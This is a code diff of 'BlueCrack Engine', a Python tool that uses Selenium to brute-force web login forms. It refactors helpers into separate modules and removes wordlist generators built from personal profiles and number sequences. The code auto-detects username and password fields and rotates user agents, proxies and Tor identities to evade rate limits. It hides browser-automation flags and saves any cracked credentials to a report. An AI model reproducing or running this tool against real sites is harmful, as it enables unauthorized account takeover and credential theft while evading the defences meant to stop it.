@@ -1,21 +1,11 @@
-#!/usr/bin/env python3
 """
-BlueCrack Engine — Core Selenium Attack Engine
-================================================
-Shared attack engine used by both the Flask web UI and CLI modes.
-Encapsulates all Selenium-based brute-force logic, CUPP integration,
-and sequence wordlist generation.
+BlueCrack Engine
+=================
+Core brute-force attack engine powered by Selenium WebDriver.
 """
 
-import builtins
-import json
-import os
-import random
-import signal
-import sys
-import threading
 import time
-from datetime import datetime
+import threading
 from queue import Queue
 from typing import Any, Callable, Dict, List, Optional, Set, Tuple
 
@@ -23,242 +13,32 @@ from selenium import webdriver
 from selenium.common.exceptions import (
     NoSuchElementException,
     TimeoutException,
-    WebDriverException,
 )
 from selenium.webdriver.common.by import By
 from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.support import expected_conditions as EC
 from selenium.webdriver.support.ui import WebDriverWait
 
-try:
-    import keyboard
-    HAS_KEYBOARD = True
-except ImportError:
-    HAS_KEYBOARD = False
+from .constants import (
+    CSS_PATH_JS,
+    AUTO_DETECT_JS,
+    CLICK_LISTENER_JS,
+    HAS_KEYBOARD,
+)
+from .utils import (
+    build_chrome_options,
+    create_driver_safe,
+    change_tor_ip,
+    save_json_report,
+)
 
-# Optional: Tor IP shifting via stem
-try:
-    from stem import Signal as TorSignal
-    from stem.control import Controller as TorController
-    HAS_STEM = True
-except ImportError:
-    HAS_STEM = False
-
-
-# ═══════════════════════════════════════════════════════════════════
-# CONSTANTS
-# ═══════════════════════════════════════════════════════════════════
-CSS_PATH_JS: str = """
-function cssPath(el){
-    if(!el) return null;
-    var p=[];
-    while(el.nodeType===1){
-        var s=el.nodeName.toLowerCase();
-        if(el.id){
-            s+='#'+el.id;
-            p.unshift(s);
-            break;
-        } else {
-            var sib=el, n=1;
-            while(sib=sib.previousElementSibling){
-                if(sib.nodeName.toLowerCase()==s) n++;
-            }
-            if(n!=1) s+=':nth-of-type('+n+')';
-        }
-        p.unshift(s);
-        el=el.parentNode;
-    }
-    return p.join(' > ');
-}
-return cssPath(arguments[0]);
-"""
-
-AUTO_DETECT_JS: str = """
-window._autoFindFields = function() {
-    let passwordField = document.querySelector('input[type="password"]');
-    let userField = null;
-    if (passwordField) {
-        let inputs = Array.from(
-            passwordField.form
-                ? passwordField.form.querySelectorAll('input')
-                : document.querySelectorAll('input')
-        );
-        for (let el of inputs) {
-            if ((el.type === 'text' || el.type === 'email' || el.name.includes('user')) && el !== passwordField) {
-                userField = el;
-                break;
-            }
-        }
-    }
-    let ucss = userField
-        ? userField.tagName.toLowerCase() + (userField.id ? '#'+userField.id : (userField.name ? '[name="'+userField.name+'"]' : ''))
-        : null;
-    let pcss = passwordField
-        ? passwordField.tagName.toLowerCase() + (passwordField.id ? '#'+passwordField.id : (passwordField.name ? '[name="'+passwordField.name+'"]' : ''))
-        : null;
-    return [ucss, pcss];
-};
-"""
-
-CLICK_LISTENER_JS: str = """
-document.addEventListener('click', function(e){ window._lastClicked = e.target; });
-"""
-
-DEFAULT_USER_AGENTS: List[str] = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-]
-
-DEFAULT_LIMIT_TEXT: str = "too many requests"
-
-# ANSI color helpers (for CLI output)
-_GREEN = "\033[32m"
-_RED = "\033[31m"
-_YELLOW = "\033[33m"
-_CYAN = "\033[36m"
-_BLUE = "\033[34m"
-_RESET = "\033[0m"
-_BOLD = "\033[1m"
-
-
-# ═══════════════════════════════════════════════════════════════════
-# HELPER FUNCTIONS
-# ═══════════════════════════════════════════════════════════════════
-def print_banner() -> None:
-    """Print the BlueCrack ASCII art banner."""
+if HAS_KEYBOARD:
     try:
-        print(
-            """
-\033[34m██████╗ ██╗     ██╗   ██╗███████╗\033[0m \033[31m ██████╗██████╗  █████╗  ██████╗██╗  ██╗\033[0m
-\033[34m██╔══██╗██║     ██║   ██║██╔════╝\033[0m \033[31m██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝\033[0m
-\033[34m██████╔╝██║     ██║   ██║█████╗  \033[0m \033[31m██║     ██████╔╝███████║██║     █████╔╝ \033[0m
-\033[34m██╔══██╗██║     ██║   ██║██╔══╝  \033[0m \033[31m██║     ██╔══██╗██╔══██║██║     ██╔═██╗ \033[0m
-\033[34m██████╔╝███████╗╚██████╔╝███████╗\033[0m \033[31m╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗\033[0m
-\033[34m╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝\033[0m \033[31m ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝\033[0m
-"""
-        )
-    except Exception:
-        print("\n  === BLUECRACK — Advanced Browser Penetration Framework ===\n")
-
-
-def change_tor_ip(control_port: int = 9051, password: Optional[str] = None) -> bool:
-    """Request a new Tor identity (new IP).
-
-    Args:
-        control_port: Tor control port number.
-        password: Optional authentication password for the Tor controller.
-
-    Returns:
-        True if identity was successfully changed, False otherwise.
-    """
-    if not HAS_STEM:
-        return False
-    try:
-        with TorController.from_port(port=control_port) as ctrl:
-            if password:
-                ctrl.authenticate(password=password)
-            else:
-                ctrl.authenticate()
-            ctrl.signal(TorSignal.NEWNYM)
-            return True
-    except Exception as e:
-        print(f"{_RED}[-] Tor IP shift failed: {e}{_RESET}")
-        return False
-
-
-def build_chrome_options(ctx: Dict[str, Any]) -> webdriver.ChromeOptions:
-    """Build ChromeOptions from the given context dictionary.
-
-    Args:
-        ctx: Configuration dictionary with keys like 'headless', 'use_tor', 'proxies', etc.
-
-    Returns:
-        Configured ChromeOptions instance.
-    """
-    options = webdriver.ChromeOptions()
-    options.add_experimental_option("excludeSwitches", ["enable-automation"])
-    options.add_experimental_option("useAutomationExtension", False)
-    options.add_argument("--disable-blink-features=AutomationControlled")
-    options.add_argument("--no-sandbox")
-    options.add_argument("--disable-dev-shm-usage")
-    options.add_argument(f"user-agent={random.choice(DEFAULT_USER_AGENTS)}")
-
-    if ctx.get("use_tor"):
-        options.add_argument("--proxy-server=socks5://127.0.0.1:9050")
-    elif ctx.get("proxies"):
-        options.add_argument(f"--proxy-server={random.choice(ctx['proxies'])}")
-
-    if ctx.get("headless"):
-        options.add_argument("--headless=new")
-        options.add_argument("--disable-gpu")
-        options.add_argument("--window-size=1920x1080")
-
-    return options
-
-
-def create_driver_safe(
-    options: webdriver.ChromeOptions, max_retries: int = 3
-) -> Optional[webdriver.Chrome]:
-    """Create a Chrome WebDriver with retry logic.
-
-    Args:
-        options: Chrome options to use.
-        max_retries: Maximum number of creation attempts.
-
-    Returns:
-        A Chrome WebDriver instance, or None if all retries failed.
-    """
-    for attempt in range(max_retries):
-        try:
-            wd = webdriver.Chrome(options=options)
-            return wd
-        except Exception as e:
-            print(f"[-] WebDriver creation attempt {attempt+1} failed: {e}")
-            if attempt < max_retries - 1:
-                time.sleep(1)
-            else:
-                return None
-    return None
-
-
-def save_json_report(
-    report_path: str,
-    target_url: str,
-    metrics: Dict[str, int],
-    found_creds: List[Tuple[str, str]],
-    start_time: float,
-    end_time: float,
-) -> None:
-    """Save a JSON report of the attack results.
-
-    Args:
-        report_path: Output file path for the JSON report.
-        target_url: The target URL that was tested.
-        metrics: Dictionary of attack metrics.
-        found_creds: List of (username, password) tuples found.
-        start_time: Unix timestamp when attack started.
-        end_time: Unix timestamp when attack ended.
-    """
-    report = {
-        "target_url": target_url,
-        "start_time": datetime.fromtimestamp(start_time).isoformat(),
-        "end_time": datetime.fromtimestamp(end_time).isoformat(),
-        "duration_seconds": round(end_time - start_time, 2),
-        "metrics": metrics,
-        "credentials_found": [{"username": u, "password": p} for u, p in found_creds],
-    }
-    try:
-        with open(report_path, "w", encoding="utf-8") as f:
-            json.dump(report, f, indent=2, ensure_ascii=False)
-    except Exception:
+        import keyboard
+    except ImportError:
         pass
 
 
-# ═══════════════════════════════════════════════════════════════════
-# ATTACK ENGINE
-# ═══════════════════════════════════════════════════════════════════
 class AttackEngine:
     """Core brute-force attack engine powered by Selenium WebDriver.
 
@@ -595,7 +375,7 @@ class AttackEngine:
                                 EC.presence_of_element_located(
                                     (By.CSS_SELECTOR, ctx["username_selector"])
                                 )
-                            )
+                             )
                             p_el = wait.until(
                                 EC.presence_of_element_located(
                                     (By.CSS_SELECTOR, ctx["password_selector"])
@@ -748,104 +528,38 @@ class AttackEngine:
 
                         except (NoSuchElementException, TimeoutException):
                             self._log(
-                                f"[-] Missing elements for {user}, retrying..."
+                                f"[-] Element not found during attempt with {user}/{pwd}"
                             )
-                            combo_key = (user, pwd)
-                            with retry_lock:
-                                retry_budget[combo_key] = (
-                                    retry_budget.get(combo_key, 0) + 1
-                                )
-                                budget_exceeded = (
-                                    retry_budget[combo_key]
-                                    > MAX_RETRIES_PER_COMBO
-                                )
-
-                            if not budget_exceeded:
-                                q.put((user, pwd))
-                                with self._metrics_lock:
-                                    self.metrics["requeued"] += 1
-                            else:
-                                with self._metrics_lock:
-                                    self.metrics["rate_retry_exhausted"] += 1
-                                done[0] += 1
-                                self._emit_progress(done[0], total)
-
-                            q.task_done()
                             with self._metrics_lock:
                                 self.metrics["errors"] += 1
-                            try:
-                                wd.quit()
-                            except Exception:
-                                pass
-                            wd = create_driver_safe(options)
-                            if wd is None:
-                                self._log(
-                                    "[-] Could not recreate browser, thread exiting"
-                                )
-                                break
-
-                        except Exception as e:
-                            combo_key = (user, pwd)
-                            with retry_lock:
-                                retry_budget[combo_key] = (
-                                    retry_budget.get(combo_key, 0) + 1
-                                )
-                                budget_exceeded = (
-                                    retry_budget[combo_key]
-                                    > MAX_RETRIES_PER_COMBO
-                                )
-
-                            if not budget_exceeded:
-                                q.put((user, pwd))
-                                with self._metrics_lock:
-                                    self.metrics["requeued"] += 1
-                            else:
-                                with self._metrics_lock:
-                                    self.metrics["rate_retry_exhausted"] += 1
-                                done[0] += 1
-                                self._emit_progress(done[0], total)
-
+                            done[0] += 1
+                            self._emit_progress(done[0], total)
                             q.task_done()
-                            msg = str(e).lower()
-                            if not any(
-                                k in msg
-                                for k in (
-                                    "invalid session id",
-                                    "detached",
-                                    "out of memory",
-                                    "no such window",
-                                )
-                            ):
-                                self._log(f"[-] Error trying {user}: {e}")
+                            self._emit_metrics()
+                        except Exception as ex:
+                            self._log(f"[-] Worker attempt error: {ex}")
                             with self._metrics_lock:
                                 self.metrics["errors"] += 1
-                            try:
-                                wd.quit()
-                            except Exception:
-                                pass
-                            wd = create_driver_safe(options)
-                            if wd is None:
-                                self._log(
-                                    "[-] Could not recreate browser, thread exiting"
-                                )
-                                break
+                            done[0] += 1
+                            self._emit_progress(done[0], total)
+                            q.task_done()
+                            self._emit_metrics()
                 finally:
                     try:
-                        if wd:
-                            wd.quit()
+                        wd.quit()
                     except Exception:
                         pass
 
-            threads_list: List[threading.Thread] = []
-            for _ in range(ctx["threads"]):
+            workers: List[threading.Thread] = []
+            for _ in range(ctx.get("threads", 1)):
                 t = threading.Thread(target=_run_worker, daemon=True)
                 t.start()
-                threads_list.append(t)
-            for t in threads_list:
+                workers.append(t)
+
+            for t in workers:
                 t.join()
 
             end_time = time.time()
-            self._emit_metrics()
 
             # Auto-save JSON report
             save_json_report(
@@ -870,112 +584,3 @@ class AttackEngine:
 
         finally:
             self._running = False
-
-
-# ═══════════════════════════════════════════════════════════════════
-# CUPP WORDLIST GENERATOR
-# ═══════════════════════════════════════════════════════════════════
-def generate_cupp_wordlist(
-    profile: Dict[str, Any],
-    log_callback: Optional[Callable[[str], None]] = None,
-) -> str:
-    """Generate a CUPP wordlist from the given profile.
-
-    Args:
-        profile: Dictionary with CUPP profile fields (name, surname, etc.).
-        log_callback: Optional callback for log messages.
-
-    Returns:
-        Absolute path to the generated wordlist file, or empty string on failure.
-    """
-    _cupp_dir = os.path.dirname(os.path.abspath(__file__))
-    sys.path.insert(0, _cupp_dir)
-    try:
-        import cupp as _cupp_mod
-    except ImportError:
-        if log_callback:
-            log_callback("[-] cupp.py not found in directory.")
-        return ""
-
-    try:
-        _cupp_mod.read_config(os.path.join(_cupp_dir, "cupp.cfg"))
-        if log_callback:
-            log_callback("[*] Generating CUPP wordlist...")
-
-        profile.setdefault("spechars1", "n")
-        profile.setdefault("randnum", "n")
-        profile.setdefault("leetmode", "n")
-
-        # Mock builtins.input to prevent CUPP from hanging
-        original_input = builtins.input
-        builtins.input = lambda prompt="": "n"
-        try:
-            _cupp_mod.generate_wordlist_from_profile(profile)
-        finally:
-            builtins.input = original_input
-
-        outfile = profile["name"] + ".txt"
-        if os.path.exists(outfile):
-            with open(outfile) as f:
-                cnt = sum(1 for _ in f)
-            if log_callback:
-                log_callback(f"[+] CUPP done! {cnt} passwords → {outfile}")
-            return os.path.abspath(outfile)
-        else:
-            if log_callback:
-                log_callback("[-] CUPP generated no output.")
-            return ""
-    except Exception as e:
-        if log_callback:
-            log_callback(f"[-] CUPP error: {e}")
-        return ""
-
-
-# ═══════════════════════════════════════════════════════════════════
-# SEQUENCE WORDLIST GENERATOR
-# ═══════════════════════════════════════════════════════════════════
-def generate_sequence_wordlist(
-    start: int,
-    end: int,
-    prefix: str = "",
-    suffix: str = "",
-    pad_width: int = 0,
-    output_path: str = "sequence_wordlist.txt",
-    log_callback: Optional[Callable[[str], None]] = None,
-) -> str:
-    """Generate a numeric/pattern-based wordlist.
-
-    Args:
-        start: Starting number.
-        end: Ending number (inclusive).
-        prefix: String prefix for each entry.
-        suffix: String suffix for each entry.
-        pad_width: Zero-padding width (0 = no padding).
-        output_path: Output file path.
-        log_callback: Optional callback for log messages.
-
-    Returns:
-        Absolute path to the generated file, or empty string on failure.
-    """
-    try:
-        if start > end:
-            start, end = end, start
-
-        count = end - start + 1
-        if log_callback:
-            log_callback(f"[*] Generating {count} sequence passwords...")
-
-        with open(output_path, "w", encoding="utf-8") as f:
-            for num in range(start, end + 1):
-                num_str = str(num).zfill(pad_width) if pad_width > 0 else str(num)
-                f.write(f"{prefix}{num_str}{suffix}\n")
-
-        if log_callback:
-            log_callback(
-                f"[+] Sequence wordlist generated! ({count} passwords) → {output_path}"
-            )
-        return os.path.abspath(output_path)
-    except Exception as e:
-        if log_callback:
-            log_callback(f"[-] Sequence generation error: {e}")
-        return ""
